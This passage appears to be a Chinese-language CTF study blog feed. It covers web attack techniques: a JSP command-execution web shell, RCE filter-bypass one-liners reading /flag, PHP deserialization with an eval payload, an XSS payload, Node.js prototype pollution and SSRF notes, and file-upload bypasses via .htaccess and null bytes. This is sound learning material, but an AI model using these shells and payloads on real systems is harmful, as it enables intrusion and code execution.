alt="9d51446618ba51c76ec67d8d48022af"></p><p>jsp格式的木马</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span> %&gt; <br>&lt;% <br><span class="hljs-title class_">String</span> cmd = <span class="hljs-string">&quot;printenv&quot;</span>; <br><span class="hljs-title class_">String</span> output = <span class="hljs-string">&quot;&quot;</span>; <br><span class="hljs-keyword">try</span> &#123; <br> <br> <br>        <span class="hljs-title class_">Process</span> p = <span class="hljs-title class_">Runtime</span>.<span class="hljs-title function_">getRuntime</span>().<span class="hljs-title function_">exec</span>(cmd); <br>        <span class="hljs-title class_">BufferedReader</span> reader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <br><span class="hljs-title class_">InputStreamReader</span>(p.<span class="hljs-title function_">getInputStream</span>())); <br>        <span class="hljs-title class_">String</span> line; <br>        <span class="hljs-keyword">while</span> ((line = reader.<span class="hljs-title function_">readLine</span>()) != <span class="hljs-literal">null</span>) &#123; <br>            output += line + <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>; <br>        &#125; <br>    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> e) &#123; <br>        output = <span class="hljs-string">&quot;Error executing command: &quot;</span> + e.<span class="hljs-title function_">getMessage</span>(); <br>    &#125; <br>%&gt; <br> <br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span> </span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Command Output<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span> </span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span> </span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>Executed Command: <span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>&lt;%= cmd %&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span> </span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span>&lt;%= output %&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span> </span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span> </span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>cmd实现命令执行</p><h2 id="4-D3-tidy-quic"><a href="#4-D3-tidy-quic" class="headerlink" title="4.D3 tidy quic"></a>4.D3 tidy quic</h2><h3 id="该-Go-脚本的核心思路与代码逻辑详解（基于-HTTP-3-缓冲区污染攻击）"><a href="#该-Go-脚本的核心思路与代码逻辑详解（基于-HTTP-3-缓冲区污染攻击）" class="headerlink" title="该 Go 脚本的核心思路与代码逻辑详解（基于 HTTP&#x2F;3 缓冲区污染攻击）"></a>该 Go 脚本的核心思路与代码逻辑详解（基于 HTTP&#x2F;3 缓冲区污染攻击）</h3><h3 id="一、攻击背景：HTTP-3-缓冲区污染漏洞"><a href="#一、攻击背景：HTTP-3-缓冲区污染漏洞" class="headerlink" title="一、攻击背景：HTTP&#x2F;3 缓冲区污染漏洞"></a><strong>一、攻击背景：HTTP&#x2F;3 缓冲区污染漏洞</strong></h3><p>HTTP&#x2F;3 基于 QUIC 协议，服务器在处理请求时可能<strong>重复使用同一块内存缓冲区</strong>（Buffer Pool）来存储不同请求的数据。若两次请求的 <code>Content-Length</code>（内容长度）相同，服务器会分配同一块固定大小的缓冲区。此时：</p><ul><li><strong>第一次请求</strong>：在缓冲区中写入数据（如包含 <code>&quot;flag&quot;</code> 的字符串）。</li><li><strong>第二次请求</strong>：覆盖缓冲区的前半部分，与第一次残留的 <code>&quot;flag&quot;</code> 拼接成特定字符串（如 <code>&quot;I want flag&quot;</code>），触发服务器的敏感逻辑（如返回 flag）。</li></ul><h3 id="二、脚本核心思路拆解"><a href="#二、脚本核心思路拆解" class="headerlink" title="二、脚本核心思路拆解"></a><strong>二、脚本核心思路拆解</strong></h3><p>该脚本通过两次 HTTP&#x2F;3 POST 请求，利用缓冲区重用机制，拼接出服务器预期的字符串，最终获取 flag。以下是关键步骤的详细解释：</p><p><img src="/%E5%9B%BE%E7%89%87/image-20250608151105334.png" alt="image-20250608151105334"></p><p><img src="/%E5%9B%BE%E7%89%87/image-20250608151144852.png" alt="image-20250608151144852"></p>]]></content>
    
    
    <categories>
      
      <category>比赛</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>node js</title>
    <link href="/2025/06/11/nodejs/"/>
    <url>/2025/06/11/nodejs/</url>
    
    <content type="html"><![CDATA[<h1 id="node-js"><a href="#node-js" class="headerlink" title="node js"></a>node js</h1><h2 id="md5"><a href="#md5" class="headerlink" title="md5"></a><strong>md5</strong></h2><p><img src="D:\ctf\笔记\图片\c079ac4aacca550c951c607d6a5e55e.png"></p><p>在示例中：</p><p>a &#x3D; {x: 1} 和 b &#x3D; {x: 2} 定义了两个不同的对象。<br>当执行 console.log(a + “test”) &#x2F;&#x2F;打印时，JavaScript 会先将对象 a 转换为字符串。由于没有为 a 定义自定义的 toString() 方法，所以会调用默认的 Object.prototype.toString() 方法，将 a 转换为 “[object Object]”，然后再与 “test” 进行字符串拼接，结果就是 “[object Object]test” 。<br>同理，对于 console.log(b + “test”) ，对象 b 也会调用默认的 Object.prototype.toString() 方法被转换为 “[object Object]”，然后与 “test” 拼接得到 “[object Object]test” 。</p><h2 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h2><p><img src="D:\ctf\笔记\图片\027683ea7b4c32aa6639a4713eadf4c.png"></p><p><img src="D:\ctf\笔记\图片\c67e977f054a9779857ba5d93e45ba4.png"></p><p>readFile和wrteFileSync是两个参数</p><h2 id="rce-bypass"><a href="#rce-bypass" class="headerlink" title="rce bypass"></a>rce bypass</h2><h3 id="1-字符拼接"><a href="#1-字符拼接" class="headerlink" title="1.字符拼接"></a>1.字符拼接</h3><p><img src="D:\ctf\笔记\图片\c5c46c4a94d987487d418d4438b3a08.png"></p><p>exec,execSync,eval可以执行命令</p><p>%2b是+，以及.concat()可以进行拼接字符bypass</p><h3 id="2-编码绕过"><a href="#2-编码绕过" class="headerlink" title="2.编码绕过"></a>2.编码绕过</h3><p><img src="D:\ctf\笔记\图片\53eb90135804ed9cb309eaced5f6f5e.png"></p><p>\x十六进制编码,\u Unicode编码,以及base64编码</p><h3 id="3-模板拼接"><a href="#3-模板拼接" class="headerlink" title="3.模板拼接"></a>3.模板拼接</h3><p><img src="D:\ctf\笔记\图片\1748256757800.jpg"></p><p>${‘ ‘}模板拼接</p><h2 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h2><h4 id="原理详解："><a href="#原理详解：" class="headerlink" title="原理详解："></a>原理详解：</h4><ol><li><strong>编码转换与截断问题</strong><ul><li><strong>Unicode 到字节的转换</strong>：JavaScript 支持 Unicode 字符串（如 <code>\u&#123;010D&#125;</code>、<code>\u&#123;010A&#125;</code>），但 Node.js 在处理无请求主体（如 GET、DELETE）的 HTTP 请求时，默认使用 <strong>latin1 编码</strong>将路径字符串转换为原始字节。</li><li><strong>latin1 编码的限制</strong>：latin1 是单字节编码（仅支持 0-255 的字符），对于高编号 Unicode 字符（如 <code>\u&#123;010D&#125;</code>，十进制值为 269，超出 latin1 范围），Node.js 会 <strong>截断其最低字节</strong>（如 <code>\u&#123;010D&#125;</code> 截断为 <code>0x0D</code>，即 <code>\r</code>；<code>\u&#123;010A&#125;</code> 截断为 <code>0x0A</code>，即 <code>\n</code>）。</li></ul></li><li><strong>HTTP 协议控制字符的注入</strong><ul><li><strong>利用截断结果</strong>：<code>\r</code> 和 <code>\n</code> 是 HTTP 协议中的 <strong>控制字符</strong>（用于分隔请求行、请求头、请求体）。攻击者在请求路径中嵌入精心构造的 Unicode 字符（如 <code>\u&#123;010D&#125;\u&#123;010A&#125;</code>），Node.js 处理时会将其转换为 <code>\r\n</code>，<strong>注入到 HTTP 请求的原始字节流中</strong>。</li><li><strong>请求拆分攻击</strong>：通过注入 <code>\r\n</code>，攻击者可篡改请求结构，将原本的单一请求拆分为多个伪造的请求（如在路径中插入新的请求头或请求体），欺骗服务器发起 <strong>未授权的内部请求</strong>（即 SSRF 攻击）。</li></ul></li><li><strong>漏洞触发条件</strong><ul><li><strong>Node.js 版本</strong>：8 或更低版本（Node.js 10 及以上已修复，对非 ASCII 字符直接报错）。</li><li>请求特征：<ul><li>接受用户输入的 <strong>Unicode 数据</strong> 并包含在请求路径中。</li><li>请求 <strong>无主体</strong>（如 GET、DELETE，此时默认使用 latin1 编码）。</li></ul></li></ul></li></ol><p><img src="D:\ctf\笔记\图片\1748257803135.jpg"></p><h2 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h2><p><img src="D:\ctf\笔记\图片\image-20250526194358035.png" alt="image-20250526194358035"></p><p>proto是object的一个私有属性，prototype是原型对象，null没有原型</p><p>实例**._<em>prototype</em>*_指向它的构造函数的原型对象</p><p><img src="D:\ctf\笔记\图片\image-20250526195607344.png" alt="image-20250526195607344"></p><p>Son.prototype&#x3D;son.<strong>proto</strong></p><p><img src="D:\ctf\笔记\图片\image-20250526202746124.png" alt="image-20250526202746124"></p><p>通过proto来改变原型的属性</p><p><img src="D:\ctf\笔记\图片\image-20250526203707315.png" alt="image-20250526203707315"></p><p>json解析使proto被当作是键名</p><p><img src="D:\ctf\笔记\图片\image-20250526205234353.png" alt="image-20250526205234353"></p><p>利用proto控制基类的成员，造成代码注入从而rce</p><p><img src="D:\ctf\笔记\图片\image-20250526205407303.png" alt="image-20250526205407303"></p><h3 id="通俗解释"><a href="#通俗解释" class="headerlink" title="通俗解释:"></a>通俗解释:</h3><ul><li>普通对象（如 {} 或 new Object () ）没有 prototype 属性，只有 <strong>proto</strong> ，指向它的原型。</li><li>函数对象（如 Object、Array、Function 等）既有 <strong>proto</strong> ，也有 prototype 。prototype 是函数对象的 “模板”，所有通过该函数创建的对象都会继承这个模板。</li></ul><p>obj–&gt;Object.prototype–&gt;null</p><p>重要概念： 1. <code>obj.__proto__</code> 是直接访问对象原型的方式 </p><p>​                     2.<code>obj.constructor.prototype</code> 是间接访问对象原型的方式 </p><p>​                     3.这两种路径都能用来修改原型，从而影响所有对象 </p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>html的学习</title>
    <link href="/2025/06/11/html%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
    <url>/2025/06/11/html%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="html的学习"><a href="#html的学习" class="headerlink" title="html的学习"></a>html的学习</h1><h2 id="1-基本标签"><a href="#1-基本标签" class="headerlink" title="1.基本标签"></a>1.基本标签</h2><pre><code class="hljs">&lt;meta nane=&quot;keywords&quot; content=&quot;html学习,编程&quot; /&gt;&lt;meta name=&quot;description&quot; content=&quot;这是一个关于html的学习&quot;&gt;&lt;meta name=&quot;author&quot;    content=&quot;fearless123&quot;&gt;</code></pre><p>不会显示，给搜索引擎看的</p><pre><code class="hljs">&lt;h1&gt;1&lt;/h1&gt; &lt;h2&gt;2&lt;/h2&gt;&lt;h3&gt;3&lt;/h3&gt;&lt;h4&gt;4&lt;/h4&gt;</code></pre><p>标题1到4，逐渐变小</p> <p>这是一个段落<br>br换到下一行<hr>换行线标签，比br多一个分割线</p><p>br换行，hr用线隔开换行</p> <!--strong,b是加粗，i是斜体，u是下划线，sup是上标,sub是下标,del是删除线,font调整字体属性:font size大小，color颜色,pre按代码的格式输出--><h2 id="2-表单form"><a href="#2-表单form" class="headerlink" title="2.表单form"></a>2.表单form</h2><h2 id="1-1-form表单"><a href="#1-1-form表单" class="headerlink" title="1.1.  form表单"></a>1.1.  form表单</h2><p>form表单 规定当提交表单时向何处发送表单数据</p><p>method 提交的方法有 get、post</p><p>规定在发送表单数据之前如何对其进行编码。</p><p>enctype 属性可能的值</p><p>​       application&#x2F;x-www-form-urlencoded    multipart&#x2F;form-data    text&#x2F;plain</p><p>input标签</p><p>name：同样是表示的该文本输入框名称。   size：输入框的长度大小。</p><p>maxlength：输入框中允许输入字符的最大数。  value：输入框中的默认值   readonly：表示该框中只能显示，不能添加修改。</p><p>input的类型</p><p>type&#x3D;password 密码输入框   type&#x3D;file 文件上传    type&#x3D;hidden 隐藏域   button 按钮</p><p>checkbox 复选框   radio 单选框   type&#x3D;submit 提交按钮      type&#x3D;reset  重置按钮</p><p>  <label>第二节课:表单</label> </p>  <form action="" method="post" >         <label>用户名</label><input type="text" name="username" size="30" maxlength="12" value="admin" readonly><br>         <label>密&nbsp;码</label><input type="password" name="password" size="30"  maxlength="12"><br>         <label for="email">邮&nbsp;箱</label><input type="text" name="emali" id="email" ><br> <!--加上id和for，点击汉字即可跳转到输入框-->         <label>掌握技能:<br></label> <label>安全开发</label><input type="checkbox"> <br>         <label>渗透测试</label><input type="checkbox"><br>         <label>性&nbsp;别</label> <label>男<input type="radio" value="1" name="sex">女<input type="radio" value="2" name="sex"></label>         <input type="hidden" value="1"> <br>         <input type="submit" value="提交"> <input type="button" size="40" value="111">         <input type="reset" value="重置"></form>  <br><br><form action="" method="post" enctype="multipart/form-data">​    <label>文件上传</label><input type="file" name="file"><br>​    <input type="submit"></form>]]></content>
    
    
    <categories>
      
      <category>开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php反序列化</title>
    <link href="/2025/06/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <url>/2025/06/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="php反序列化漏洞"><a href="#php反序列化漏洞" class="headerlink" title="php反序列化漏洞"></a><strong>php反序列化漏洞</strong></h1><h2 id="一、php面向对象基础"><a href="#一、php面向对象基础" class="headerlink" title="一、php面向对象基础"></a>一、php面向对象基础</h2><p>1.面向过程<br>        面向过程是一种以“整体事件”为中心的编程思想，编程的时候把解决问题的步骤分析出来，然后用函数把这些步骤实现，在一步一步的具体步骤中再按顺序调用函数；</p><p>2.面向对象<br>        面向对象是一种以“对象”为中心的编程思想，把要解决的问题分解成各个“对象”；对象是一个由信息及对信息进行处理的描述所组成的整体，是对现实世界的抽象；</p><p>对象的三个特征：对象的行为，对象的形态，对象的表示</p><p>3.类的定义<br>        类是定义了一件事物的抽象特点，它将数据的形式以及这些数据上的操作封装在一起；对象是具有类类型的变量，是对类的实例；</p><pre><code class="hljs">    类的定义包括定义类名、定义成员属性、定义成员方法；</code></pre><p>内部构成：成员属性(变量)+成员方法(函数)</p><p>4.继承<br>        继承性是子类自动共享父类数据结构和方法的机制，是类之间的一种关系；</p><pre><code class="hljs">    在定义和实现一个类的时候，可以在一个已经存在的类的基础之上来进行，把一个已经存在的类所定义的内容作为自己的内容，并加入若干新的内容；</code></pre><p>父类：一个类被其它类继承，可将该类成为父类，或基类，超类；</p><p>子类：一个类继承其他类称为子类，也可称为派生类；</p><p>5.类的访问权限修饰符<br>public：公共的，在类的内部、子类和类的外部中都可以被调用；</p><p>protected：受保护的，在类的内部和子类可以被调用，在类的外部不可调用；</p><p>private：私有的，只能在类的内部调用，在子类和类的外部不可调用；</p><h2 id="二、序列化基础"><a href="#二、序列化基础" class="headerlink" title="二、序列化基础"></a>二、序列化基础</h2><h3 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h3><p>​        序列化是将对象或数组转化为方便存储、传输的字符串，php使用serialize()函数将对象序列化；</p><pre><code class="hljs">    序列化只作用于对象的成员属性，不序列化成员方法；</code></pre><h3 id="2-序列化值"><a href="#2-序列化值" class="headerlink" title="2.序列化值"></a>2.序列化值</h3><p>各类型值的serialize序列化：</p><p>空字符              null                -&gt;            N;</p><p>整型                   123            -&gt;         i:123;</p><p>浮点型                1.5             -&gt;         d:1.5;</p><p>boolean型          true            -&gt;         b:1;</p><p>boolean型          false            -&gt;         b:0;</p><p>字符串               “haha”           -&gt;        s:4:”haha”;</p><p>3.对象序列化<br>&#x2F;&#x2F;对象序列化</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>class test<br>&#123;<br>    private $a1=&quot;haha&quot;;<br>    protected $a2=&quot;dada&quot;;<br>    public $a3=&quot;sasa&quot;;<br>    public $b=true;<br>    public  $c=123;<br>&#125;<br>$d=new test();<br>echo serialize($d);<br>?&gt;<br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;输出为：<br>O:4:”test”:5:{s:8:” test a1”;s:4:”haha”;s:5:” * a2”;s:4:”dada”;s:2:”a3”;s:4:”sasa”;s:1:”b”;b:1;s:1:”c”;i:123;}</p><p>&#x2F;&#x2F;解释：大写字母O表示对象，4是类名长度，test为类名，5表示该类有5个成<br>&#x2F;&#x2F;员属性，注意private私有属性序列化的属性名格式为“%00类名%00属性名”，<br>&#x2F;&#x2F;%00为空格，如上的“ test a1”，protected受保护属性序列化的属性名格<br>&#x2F;&#x2F;式为“%00*%00属性名”，如上的“ * a2”，对于存在这两种类型的成员属性的<br>&#x2F;&#x2F;类在写payload时通常会使用urlencode()函数编码；其他都是正常的序列化</p><p>Public(公有):被序列化时属性值为：属性名<br>Protected(受保护):被序列化时属性值为：\x00*\x00属性名<br>Private(私有):被序列化时属性值为：\x00类名\x00属性名<br> 4.pop链序列化<br>&#x2F;&#x2F;pop链序列化</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>class test1<br>&#123;<br>    public $a=&quot;haha&quot;;<br>    public $b=true;<br>    public $c=123;<br>&#125;<br>class test2<br>&#123;<br>    public $h=&quot;hhh&quot;;<br>    public $d;<br>&#125;<br><br>$m=new test1();<br>$n=new test2();<br>$n-&gt;d=$m;<br>echo serialize($n);<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;输出：<br>O:5:”test2”:2:{s:1:”h”;s:3:”hhh”;s:1:”d”;O:5:”test1”:3:{s:1:”a”;s:4:”haha”;s:1:”b”;b:1;s:1:”c”;i:123;}}<br>&#x2F;&#x2F;对象的成员属性为另一个对象，序列化值出现如上嵌套<br> 5.数组序列化<br>&#x2F;&#x2F;数组序列化<br><?php$ha=array("haha",123,true,"ggg");echo serialize($ha);?><br>&#x2F;&#x2F;输出：<br>a:4:{i:0;s:4:”haha”;i:1;i:123;i:2;b:1;i:3;s:3:”ggg”;}</p><p>&#x2F;&#x2F;解释：a表示这是一个数组的序列化，成员属性名为数组的下标，格式”i:数组下标;”<br>&#x2F;&#x2F;其他与正常序列化一致</p><h2 id="三、反序列化"><a href="#三、反序列化" class="headerlink" title="三、反序列化"></a>三、反序列化</h2><h3 id="1-概述-1"><a href="#1-概述-1" class="headerlink" title="1.概述"></a>1.概述</h3><p>​        反序列化是将序列化得到的字符串转化为一个对象的过程；</p><pre><code class="hljs">    反序列化生成的对象的成员属性值由被反序列化的字符串决定，与原来类预定义的值无关；    反序列化使用unserialize()函数将字符串转换为对象，序列化使用serialize()函数将对象转化为字符串；</code></pre><p>&#x2F;&#x2F;反序列化</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>class test<br>&#123;<br>    public $a=&quot;haha&quot;;<br>    public $b=123;<br>&#125;<br><br>$ha=&#x27;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:3:&quot;666&quot;;s:1:&quot;b&quot;;i:6666;&#125;&#x27;;<br>$ha=unserialize($ha)<br>var_dump($ha);<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;输出：<br>object(test)#1 (2) {<br>  [“a”]&#x3D;&gt;  string(3) “666”<br>  [“b”]&#x3D;&gt;  int(6666)<br>}</p><p>&#x2F;&#x2F;如上将字符串转换为对象，且对象的值与类预定义的值无关，取决于被反序列化的字符串<br>2.反序列化漏洞的成因<br>        反序列化过程中unserialize()函数的参数可以控制，传入特殊的序列化后的字符串可改变对象的属性值，并触发特定函数执行代码；</p><p>&#x2F;&#x2F;反序列化漏洞简单案例</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs text"><br>&lt;?php<br>class test<br>&#123;<br>    public $a=&quot;haha&quot;;<br>    public function display()<br>    &#123;<br>        eval($this-&gt;a);<br>    &#125;<br>&#125;<br> $cmd=$_GET[&#x27;cmd&#x27;];<br>//cmd=O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:10:&quot;phpinfo();&quot;;&#125;<br>$d=unserialize($cmd);<br>$d-&gt;display();<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;如上反序列化的内容是GET方法获得的，是可控的，传入上图注释中的cmd<br>&#x2F;&#x2F;内容，可实现执行php代码：phpinfo();<br>————————————————</p><p>原文链接：<a href="https://blog.csdn.net/m0_73185293/article/details/131353031">https://blog.csdn.net/m0_73185293/article/details/131353031</a></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>rce进阶</title>
    <link href="/2025/06/11/rce%E8%BF%9B%E9%98%B6/"/>
    <url>/2025/06/11/rce%E8%BF%9B%E9%98%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="rce进阶"><a href="#rce进阶" class="headerlink" title="rce进阶"></a>rce进阶</h1><p>a&#x3D;$a&#x3D;”syst”.”em”;$a(“tac &#x2F;flag”);<br>a&#x3D;echo <code>ls /flag</code>;<br>a&#x3D;print_r(scandir(“.”));  a&#x3D;print_r(file_get_content(“flag&#x2F;php”));</p><p>cmd&#x3D;&#x2F;???&#x2F;?a??64  &#x2F;??a?      &#x2F;&#x2F;禁用字母和符号<br>cmd&#x3D;tac%09&#x2F;flag               &#x2F;&#x2F;禁用空格  %09 $IFS<br>cmd&#x3D;tac &#x2F;flag; || %0a                    &#x2F;&#x2F;绕过 system($cmd.”&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1”);<br>c&#x3D;nl&lt;fla’’g.php||                    &#x2F;&#x2F;禁用%</p><p>八进制绕过</p><p><code>&lt;?php</code></p><p><code>function stringToOctal($string) &#123;     $parts = explode(&#39; &#39;, $string);     $octalParts = [];</code></p><pre><code class="hljs">foreach ($parts as $part) &#123;    $octalArray = [];    for ($i = 0; $i &lt; strlen($part); $i++) &#123;        $octalArray[] = sprintf(&#39;%03o&#39;, ord($part[$i]));    &#125;    $octalString = implode(&#39;\\&#39;, $octalArray);    $octalParts[] = &quot;$&#39;\\$octalString&#39;&quot;;&#125;return implode(&#39; &#39;, $octalParts);</code></pre><p><code>&#125;</code></p><p><code>// 将带分隔符的八进制表示转换为字符串</code><br><code>function octalToString($octal) &#123;     $octalParts = explode(&#39; &#39;, $octal);     $stringParts = [];</code></p><pre><code class="hljs">foreach ($octalParts as $part) &#123;    $strippedOctal = substr($part, 2, -1); // 去掉 $&#39; 和 &#39;    $octalArray = explode(&#39;\\&#39;, $strippedOctal);    $string = &#39;&#39;;    foreach ($octalArray as $octalChar) &#123;        $string .= chr(octdec($octalChar));    &#125;    $stringParts[] = $string;&#125;return implode(&#39; &#39;, $stringParts);</code></pre><p><code>&#125;</code></p><p><code>// 示例用法</code><br><code>$originalString = &quot;cat exp.php&quot;; $octal = stringToOctal($originalString);</code></p><p><code>echo &quot;原始字符串: &quot; . $originalString . &quot;            &quot;; echo &quot;八进制表示: &quot; . $octal ;</code></p><p><code>?&gt;</code></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xss</title>
    <link href="/2025/06/11/xss%E6%BC%8F%E6%B4%9E/"/>
    <url>/2025/06/11/xss%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><h2 id="构造闭合"><a href="#构造闭合" class="headerlink" title="构造闭合"></a>构造闭合</h2><p>  浮生日记 </p><p> title提示让我们弹个窗</p><p> 测过无ssti，结合题目名字，合理可以想到js注入</p><p> 发现替换了script为空，然后赋值给value</p><p> 显然可以先闭合value，然后独立出一个script执行恶意代码</p><p> payload:</p><p>“&gt;<scrscriptipt>alert(1)</scrscriptipt><br>————————————————</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件上传漏洞</title>
    <link href="/2025/06/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <url>/2025/06/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>文件上传漏洞是指服务器对用户上传的文件类型或内容未严格限制，导致攻击者可上传恶意文件（如木马、脚本），从而在服务器上执行恶意代码的漏洞。</p><h1 id="1-js检查"><a href="#1-js检查" class="headerlink" title="1.js检查:"></a>1.js检查:</h1><p>先是后缀为.jpg，然后利用bp抓包，将后缀改成.php</p><h1 id="2-可解析后缀"><a href="#2-可解析后缀" class="headerlink" title="2.可解析后缀:"></a>2.可解析后缀:</h1><p>如php3 php2等</p><h1 id="3-上传-htaccess和-user-ini文件"><a href="#3-上传-htaccess和-user-ini文件" class="headerlink" title="3.上传.htaccess和.user.ini文件:"></a>3.上传.htaccess和.user.ini文件:</h1><p>就是在Apache服务器中加入特殊脚本，将特定后缀名当做php解析,再上传jpg文件即可</p><p> <code>AddType application/x-httpd-php .jpg</code></p><p>上传完配置文件要访问&#x2F;upload&#x2F;1.png激活木马</p><p>.user.ini</p><p><code>auto_append_file=1.txt</code></p><h1 id="4-大小写绕过"><a href="#4-大小写绕过" class="headerlink" title="4.大小写绕过"></a>4.大小写绕过</h1><h1 id="5-DATA绕过"><a href="#5-DATA绕过" class="headerlink" title="5.::$DATA绕过:"></a>5.::$DATA绕过:</h1><p>利用bp，在php后面加::$DATA</p><p>仅仅windows可以</p><h1 id="6-双写绕过"><a href="#6-双写绕过" class="headerlink" title="6.双写绕过:"></a>6.双写绕过:</h1><p> .pphphp 自动识别第一个php使之为空(后端黑名单删后缀)</p><h1 id="7-0x00绕过"><a href="#7-0x00绕过" class="headerlink" title="7.0x00绕过:"></a>7.0x00绕过:</h1><p>利用bp，修改上传路径包含.php然后加上0x00，使后面的内容无效</p><h1 id="8-黑名单绕过"><a href="#8-黑名单绕过" class="headerlink" title="8.黑名单绕过:"></a>8.黑名单绕过:</h1><p>后缀名后加空格或特殊字符.</p><p>若为一次校验，则在php后使用. <strong>.空格</strong>绕过</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
